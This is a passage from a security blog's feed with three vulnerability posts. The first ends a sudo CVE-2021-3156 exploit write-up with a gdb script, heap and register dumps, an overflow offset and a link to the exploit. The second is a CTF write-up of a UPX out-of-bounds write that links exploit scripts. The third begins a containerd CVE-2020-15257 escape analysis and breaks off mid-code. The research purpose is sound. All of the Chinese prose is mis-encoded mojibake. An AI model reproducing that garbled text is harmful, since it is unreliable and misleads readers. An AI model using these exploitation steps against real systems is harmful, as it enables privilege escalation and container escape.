çš„ç¨‹åºæ‰§è¡Œçš„æ—¶å€™å´ï¼Œå¤±è´¥äº†ï¼Œè¿™ä¸ªæ—¶å€™å‘ç°è‡ªå·±ç¼–è¯‘çš„å’Œç³»ç»Ÿè‡ªå¸¦è¿˜æ˜¯ä¸ä¸€æ ·çš„ï¼Œäºæ˜¯æˆ‘åˆå†™äº†ä¸€ä¸ªä¸æ˜¯è‡ªå·±ç¼–è¯‘çš„åˆ©ç”¨ã€‚</p><p>å½“éæºç è°ƒè¯•çš„æ—¶å€™ï¼Œç”±äºæ¼æ´å‡½æ•°æ˜¯ä½äº <code>sudoers.so</code>ä¸­ï¼Œè¯¥ so åº“å¹¶ä¸æ˜¯ä¸€å¼€å§‹å°±åŠ è½½çš„ï¼Œæˆ‘ä»¬æ²¡æ³•åœ¨æ²¡æœ‰ç¬¦å· å’Œ æ²¡æœ‰åŠ è½½çš„æƒ…å†µä¸‹ç›´æ¥ä¸‹æ–­ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æˆ‘ä»¬çš„ <code>payload</code> è®¾ç½®ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦ï¼Œ æ¯”å¦‚ <code>0xdeadbeaf</code> æ¯”å¦‚æˆ‘è¿™é‡Œè®¾ç½®ä¸€ä¸ªå•ç‹¬çš„è®¾ç½® args å‚æ•°ä¸º â€BBBBBBâ€</p><p>ä»¥åŠæˆ‘ä»¬å†é€‰æ‹©å¯¹ libc ä¸­çš„ <code>__libc_dlopen_mode</code> å‡½æ•°ä¸‹æ–­ï¼Œå› ä¸ºæˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯ dlopen æˆ‘ä»¬çš„ç›®æ ‡ so ç¨‹åºï¼Œä»¥åŠä¸‹åˆ°è¿™ä¸ªï¼Œä¹Ÿç›¸å½“äºåˆ°äº† nss_load å‡½æ•°é™„è¿‘äº†ã€‚</p><p>ä½†æ˜¯å¯¹è¿™ä¸ª<code> __libc_dlopen_mode</code> å¯èƒ½éœ€è¦ glibc çš„è°ƒè¯•ç¬¦å·ï¼Œå¯ä»¥é€šè¿‡ <code>apt install libc6-dbg</code>  æ¥å®‰è£…ï¼Œä»¥åŠä¸‹æ–­éœ€è¦å¼€å¯ <code>Pending Breakpoints</code> åŠŸèƒ½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># cat gdbscript</span><br><span class="line">catch exec</span><br><span class="line">set breakpoint pending on</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b __libc_dlopen_mode</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>gdb ./exploit -x gdbscript</code></p><p>c ä¸€æ¬¡ï¼Œ æ–­åˆ° <code>__libc_dlopen_mode</code> è¿™æ˜¯ç¬¬ä¸€æ¬¡ sudo åœ¨æ‰§è¡Œ <code>set_cmnd</code> ä¹‹å‰ <code>getpwuid</code> çš„ nss_load æ“ä½œ</p><p>å† c ä¸€æ¬¡ ï¼Œ è¿™ä¸ªå°±æ˜¯ <code>set_cmnd</code> ä¹‹åå°±çš„ nss_load , æ­¤æ—¶å°±æ˜¯æº¢å‡ºä¹‹åçš„ï¼Œ æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>search BBBB</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search &quot;BBBB&quot;</span><br><span class="line">[heap]          0x555555588bc0 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc4 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line">[heap]          0x555555588bc8 0x4242424242424242 (&#39;BBBBBBBB&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥çœ‹æˆ‘ä»¬åˆ†é…çš„å †çš„ä½ç½®</p><p>ä»¥åŠæŸ¥çœ‹æ­¤æ—¶çš„å¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">*RAX  0x7fffffffb2ea â—‚â€” 0x336a00322e6f732e &#x2F;* &#39;.so.2&#39; *&#x2F;</span><br><span class="line">*RBX  0x555555585df0 â€”â–¸ 0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line"> RCX  0x322e</span><br><span class="line">*RDX  0x582f58</span><br><span class="line">*RDI  0x7fffffffb2e0 â—‚â€” &#39;libnss_X&#x2F;X.so.2&#39;</span><br><span class="line"> RSI  0x80000002</span><br><span class="line">*R8   0x555555585df0 â€”â–¸ 0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R9   0x7fffffffb1f0 â—‚â€” 0x0</span><br><span class="line">*R10  0x10</span><br><span class="line"> R11  0x7ffff7f37be0 (main_arena+96) â€”â–¸ 0x5555555a06e0 â—‚â€” 0x0</span><br><span class="line">*R12  0x5555555891b0 â—‚â€” 0x0</span><br><span class="line">*R13  0x5555555891e0 â—‚â€” 0x4300206100582f58 &#x2F;* &#39;X&#x2F;X&#39; *&#x2F;</span><br><span class="line">*R14  0x7fffffffb2f0 â€”â–¸ 0x7ffff7f0336a â—‚â€” 0x6225206125000200</span><br><span class="line">*R15  0x16</span><br><span class="line">*RBP  0x7fffffffb340 â€”â–¸ 0x7fffffffb3a0 â—‚â€” 0x0</span><br><span class="line">*RSP  0x7fffffffb2d8 â€”â–¸ 0x7ffff7e9262c (nss_load_library+364) â—‚â€” mov    r10, qword ptr [rbp - 0x48]</span><br><span class="line"> RIP  0x7ffff7eae930 (__libc_dlopen_mode) â—‚â€” endbr64 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>0x5555555891e0 åœ°å€ä¸ºè¦è¢«è¦†ç›–çš„ç›®æ ‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x 0x5555555891e0 - 0x555555588bc0</span><br><span class="line">$1 &#x3D; 0x620</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ ·çš„æ–¹æ³•æ¥æŸ¥çœ‹ä¸¤è€…çš„åç§»</p><p>æœ€åçš„åˆ©ç”¨è§ <a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" title="image-20210201155514383" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" alt="image-20210201155514383"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events">https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2021-3156" scheme="https://bestwing.me/tags/CVE-2021-3156/"/>
    
  </entry>
  
  <entry>
    <title>RWCTF-3rd JunkAV writeup</title>
    <link href="https://bestwing.me/RWCTF-3rd-writeup.html"/>
    <id>https://bestwing.me/RWCTF-3rd-writeup.html</id>
    <published>2021-01-10T16:00:00.000Z</published>
    <updated>2021-01-11T09:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>I made a challenge name <a href="https://github.com/chaitin/Real-World-CTF-3rd-Challenge-Attachments/tree/main/JunkAV">JunkAV</a> for RWCTF 3rd .  This is an oob write vulnerability caused by a upx processing PE program.  Congratulations to CodeR00t and 217 who solved it during the game.</p><blockquote><p>Thank <a href="https://twitter.com/leommxj">@leommxj</a> for contributing to this challenge</p></blockquote><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>Vulnerability is in the PeFile::rebuildRelocs function of pefile.cpp in upx 3.96 .</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png"></a></p><p>When calling the unoptimizeReloc function</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png"></a></p><ol><li>The size of the relocn can be controlled by the user, so the allocation size can be controlled.</li><li>The 1024-1033 guild will flip the data.</li><li>When the data is flipped later, the <code>jc</code> variable on line 1021 becomes controllable, and finally the oob write is completed on line 1023</li></ol><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><p>generated upx compressed program :</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py</a></p></li><li><p>ibuf_mod :</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod">http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod</a></p></li><li><p>IO script:</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py</a></p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/">https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-15257 Docker é€ƒé€¸æ¼æ´åˆ†æ</title>
    <link href="https://bestwing.me/CVE-2020-15257-anaylysis.html"/>
    <id>https://bestwing.me/CVE-2020-15257-anaylysis.html</id>
    <published>2020-12-04T16:00:00.000Z</published>
    <updated>2021-06-27T06:59:12.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CVE-2020-15257ï¼ˆDocker-å®¹å™¨é€ƒé€¸ï¼‰"><a href="#CVE-2020-15257ï¼ˆDocker-å®¹å™¨é€ƒé€¸ï¼‰" class="headerlink" title="CVE-2020-15257ï¼ˆDocker å®¹å™¨é€ƒé€¸ï¼‰"></a>CVE-2020-15257ï¼ˆDocker å®¹å™¨é€ƒé€¸ï¼‰</h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>2020/11/30ï¼Œå…¬å¼€äº† <a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"><strong>CVE-2020-15257</strong></a> çš„ç»†èŠ‚ã€‚è¯¥æ¼æ´å½±å“ containerd 1.3.x, 1.2.x, 1.4.x ç‰ˆæœ¬</p><p>ç”±äºåœ¨ host æ¨¡å¼ä¸‹ï¼Œå®¹å™¨ä¸ <strong>host</strong> å…±äº«ä¸€å¥— <strong>Network namespaces</strong> ï¼Œæ­¤æ—¶ <strong>containerd-shim API</strong> æš´éœ²ç»™äº†ç”¨æˆ·ï¼Œè€Œä¸”è®¿é—®æ§åˆ¶ä»…ä»…éªŒè¯äº†è¿æ¥è¿›ç¨‹çš„æœ‰æ•ˆUIDä¸º0ï¼Œä½†æ²¡æœ‰é™åˆ¶å¯¹æŠ½è±¡UnixåŸŸå¥—æ¥å­—çš„è®¿é—®ã€‚æ‰€ä»¥å½“ä¸€ä¸ªå®¹å™¨ä¸º root æƒé™ï¼Œä¸”å®¹å™¨çš„ç½‘ç»œæ¨¡å¼ä¸º <code>--net=host</code> çš„æ—¶å€™ï¼Œé€šè¿‡ <strong>ontainerd-shim API</strong>  å¯ä»¥è¾¾æˆå®¹å™¨é€ƒé€¸çš„ç›®çš„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png"></a></p><h3 id="containerd-shim"><a href="#containerd-shim" class="headerlink" title="containerd-shim"></a>containerd-shim</h3><p>åœ¨è¿›ä¸€æ­¥äº†è§£æ¼æ´åŸç†ä¹‹å‰ï¼Œ æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹å•Š <strong>containerd-shim</strong> æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨ 1.11 ç‰ˆæœ¬ä¸­ï¼ŒDocker è¿›è¡Œäº†é‡å¤§çš„é‡æ„ï¼Œç”±å•ä¸€çš„ Docker Daemonï¼Œæ‹†åˆ†æˆäº† 4 ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼šDocker Daemonã€containerdã€containerd-shimã€runC</p><p>å…¶ä¸­ï¼Œcontainerd æ˜¯ç”± Docker Daemon ä¸­çš„å®¹å™¨è¿è¡Œæ—¶åŠå…¶ç®¡ç†åŠŸèƒ½å‰¥ç¦»äº†å‡ºæ¥ã€‚docker å¯¹å®¹å™¨çš„ç®¡ç†å’Œæ“ä½œåŸºæœ¬éƒ½æ˜¯é€šè¿‡ containerd å®Œæˆçš„ã€‚</p><p>å®ƒå‘ä¸Šä¸º Docker Daemon æä¾›äº† gRPC æ¥å£ï¼Œå‘ä¸‹é€šè¿‡ containerd-shim ç»“åˆ runCï¼Œå®ç°å¯¹å®¹å™¨çš„ç®¡ç†æ§åˆ¶ã€‚containerd è¿˜æä¾›äº†å¯ç”¨äºä¸å…¶äº¤äº’çš„ API å’Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ctrã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œå³ä½¿ä¸è¿è¡Œ Docker Daemonï¼Œä¹Ÿèƒ½å¤Ÿç›´æ¥é€šè¿‡ containerd æ¥è¿è¡Œã€ç®¡ç†å®¹å™¨ã€‚</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" title="image-20201206002348825" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" alt="image-20201206002348825" style="zoom:50%;" /></a><p>â€‹    </p><p>è€Œä¸­é—´çš„ <strong>containerd-shim</strong> å¤¹æ‚åœ¨ containerd å’Œ runc ä¹‹é—´ï¼Œæ¯æ¬¡å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ containerd-shim è¿›ç¨‹ï¼Œå®ƒé€šè¿‡æŒ‡å®šçš„ä¸‰ä¸ªå‚æ•°ï¼šå®¹å™¨ idã€bundle ç›®å½•ã€è¿è¡Œæ—¶äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œæ¥è°ƒç”¨è¿è¡Œæ—¶çš„ API åˆ›å»ºã€è¿è¡Œå®¹å™¨ï¼ŒæŒç»­å­˜åœ¨åˆ°å®¹å™¨å®ä¾‹è¿›ç¨‹é€€å‡ºä¸ºæ­¢ï¼Œå°†å®¹å™¨çš„é€€å‡ºçŠ¶æ€åé¦ˆç»™ containerd</p><p>å…³äº <strong>containerd-shim</strong> çš„ä½œç”¨ç»†èŠ‚å¯ä»¥å‚è€ƒä½œè€…çš„ <a href="https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf">slide</a></p><p>æœ€ç»ˆ ** containerd-shim ** åˆ›å»ºçš„å®¹å™¨çš„æ“ä½œå…¶å®è¿˜æ˜¯è½å®åˆ°äº† <strong>runc</strong> ä¸Šï¼Œ è€Œä¼—æ‰€å‘¨çŸ¥<strong>runC</strong> æ˜¯ä¸€ä¸ªæ ¹æ® OCI ï¼ˆOpen Container Initiativeï¼‰æ ‡å‡†åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨çš„ CLI toolã€‚</p><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>æ¼æ´åŸå› åœ¨å‰è¨€éƒ¨åˆ†å·²ç»å†™å¾—å¾ˆæ¸…æ¥šäº†ï¼Œè¯´ç™½äº†å°±è¯´ æš´éœ²äº†ä¸è¯¥æœ‰çš„ API æ¥å£ï¼Œè€Œ   <strong>containerd-shim</strong>  çš„ API æ¥å£ç”± Unix åŸŸå¥—æ¥å­— å®ç°ã€‚ä»£ç å®ç°ä½äº</p><p><a href="https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136</a></p><p>å®é™…ä¸Šåœ¨ï¼Œ docker å®¹å™¨ä¸­ï¼ˆä»¥ â€“net=host è¿è¡Œ),   <strong>containerd-shim</strong>   API å¤§æ¦‚é•¿è¿™æ ·</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" title="image-20201206003829351" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" alt="image-20201206003829351"></a></p><blockquote><p><strong>1)/var/run/docker.sock</strong>ï¼šDocker Daemon ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œç”¨äº Docker client ä¹‹é—´é€šä¿¡ï¼›</p><p><strong>2)/run/containerd/containerd.sock</strong>ï¼šcontainerd ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼ŒDocker Daemonã€ctr å¯ä»¥é€šè¿‡å®ƒå’Œ containerd é€šä¿¡ï¼›</p><p><strong>3)@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</strong>ï¼š</p><p>è¿™ä¸ªå°±æ˜¯ä¸Šæ–‡æ‰€è¿°çš„ï¼Œcontainerd-shim ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œcontainerd é€šè¿‡å®ƒå’Œ containerd-shim é€šä¿¡ï¼Œæ§åˆ¶ç®¡ç†å®¹å™¨ã€‚</p><p>/var/run/docker.sockã€/run/containerd/containerd.sock è¿™ä¸¤è€…æ˜¯æ™®é€šçš„æ–‡ä»¶è·¯å¾„ï¼Œè™½ç„¶å®¹å™¨å…±äº«äº†ä¸»æœºçš„ç½‘ç»œå‘½åç©ºé—´ï¼Œä½†æ²¡æœ‰å…±äº« mnt å‘½åç©ºé—´ï¼Œå®¹å™¨å’Œä¸»æœºä¹‹é—´çš„ç£ç›˜æŒ‚è½½ç‚¹å’Œæ–‡ä»¶ç³»ç»Ÿä»ç„¶å­˜åœ¨éš”ç¦»ï¼Œæ‰€ä»¥åœ¨å®¹å™¨å†…éƒ¨ä¹‹é—´ä»ç„¶ä¸èƒ½é€šè¿‡ /var/run/docker.sockã€/run/containerd/containerd.sock è¿™æ ·çš„è·¯å¾„è¿æ¥å¯¹åº”çš„ Unix åŸŸå¥—æ¥å­—ã€‚</p><p>ä½†æ˜¯ @/containerd-shim/{sha256}.sock è¿™ä¸€ç±»çš„æŠ½è±¡ Unix åŸŸå¥—æ¥å­—ä¸ä¸€æ ·ï¼Œå®ƒæ²¡æœ‰ä¾é  mnt å‘½åç©ºé—´åšéš”ç¦»ï¼Œè€Œæ˜¯ä¾é ç½‘ç»œå‘½åç©ºé—´åšéš”ç¦»ã€‚</p></blockquote><p>containerd ä¼ é€’ Unix åŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ç»™ <strong>containerd-shim</strong>ã€‚<strong>containerd-shim</strong> åœ¨æ­£å¼å¯åŠ¨ä¹‹åï¼Œä¼šåŸºäºçˆ¶è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯ containerdï¼‰ä¼ é€’çš„ Unix åŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ï¼Œå»ºç«‹ gRPC æœåŠ¡ï¼Œå¯¹å¤–æš´éœ²ä¸€äº› API ç”¨äº containerã€task çš„æ§åˆ¶ï¼š</p><p>é€šè¿‡æŸ¥é˜…ä»£ç ï¼Œæˆ‘ä»¬å¤§æ¦‚çŸ¥é“æˆ‘ä»¬å¦‚æœèƒ½æ­£å¸¸è®¿é—® <strong>containerd-shim</strong> æ¥å£ï¼Œæˆ‘ä»¬å¤§æ¦‚èƒ½æœ‰è¿™äº›æ“ä½œ</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto</a></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Shim</span> </span>&#123;</span><br><span class="line"><span class="comment">// State returns shim and task state information.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> State(StateRequest) <span class="keyword">returns</span> (StateResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Create(CreateTaskRequest) <span class="keyword">returns</span> (CreateTaskResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Start(StartRequest) <span class="keyword">returns</span> (StartResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Delete(google.protobuf.Empty) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> DeleteProcess(DeleteProcessRequest) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListPids(ListPidsRequest) <span class="keyword">returns</span> (ListPidsResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Pause(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Resume(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Checkpoint(CheckpointTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Kill(KillRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Exec(ExecProcessRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ResizePty(ResizePtyRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> CloseIO(CloseIORequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShimInfo returns information about the shim.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ShimInfo(google.protobuf.Empty) <span class="keyword">returns</span> (ShimInfoResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Update(UpdateTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Wait(WaitRequest) <span class="keyword">returns</span> (WaitResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›æ¥å£ï¼Œä»åå­—åŸºæœ¬å¯ä»¥çŒœæµ‹ä¸å®¹å™¨ç®¡ç†è¯´æœ‰å…³ç³»çš„ï¼Œ æ¯”å¦‚     <code>Create</code> ã€<code>Start</code> ã€<code>Delete</code></p><p>é€šè¿‡æŸ¥çœ‹ä»£ç     </p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80">https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireSameUser resolves the current effective unix user and returns aStephen J Day, 3 years ago: â€¢ vendor: update ttrpc to pull in euid change</span></span><br><span class="line"><span class="comment">// UnixCredentialsFunc that will validate incoming unix connections against 